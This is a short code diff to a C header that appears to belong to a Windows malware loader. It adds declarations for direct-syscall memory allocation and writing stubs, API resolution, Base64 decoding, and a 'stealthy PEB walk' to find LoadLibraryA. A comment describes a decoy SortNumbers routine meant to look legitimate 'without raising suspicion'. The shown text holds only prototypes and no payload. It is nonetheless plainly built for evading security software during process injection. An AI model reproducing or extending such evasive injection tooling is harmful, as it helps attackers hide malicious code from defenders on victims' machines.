@@ -6,6 +6,8 @@
 
 #define ARRAY_SIZE 1000
 
+typedef HMODULE(WINAPI* pLoadLibraryA)(LPCSTR);
+
 DWORD GetSyid(LPCSTR functionName);
 
 extern DWORD smID;
@@ -16,6 +18,7 @@ extern NTSTATUS CustAVM(HANDLE hProcess, PVOID *BaseAddress, ULONG ZeroBits, PSI
 
 extern NTSTATUS CustWVM(HANDLE hProcess, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesWritten);
 
+// Function to Resolve APIs
 FARPROC ResolveFn(LPCSTR mod, LPCSTR fn);
 
 // Base64Decode
@@ -26,6 +29,9 @@ This function will generate 1,000 random numbers, sort them, and compute the ave
 It looks like legitimate processing activity without raising suspicion.
 */
 void SortNumbers();
+
+// Function to retrieve LoadLibraryA using a stealthy PEB walk
+pLoadLibraryA GetLoadLibraryA();
 
 #ifdef _M_X64
 #define PEB_OFFSET 0x60
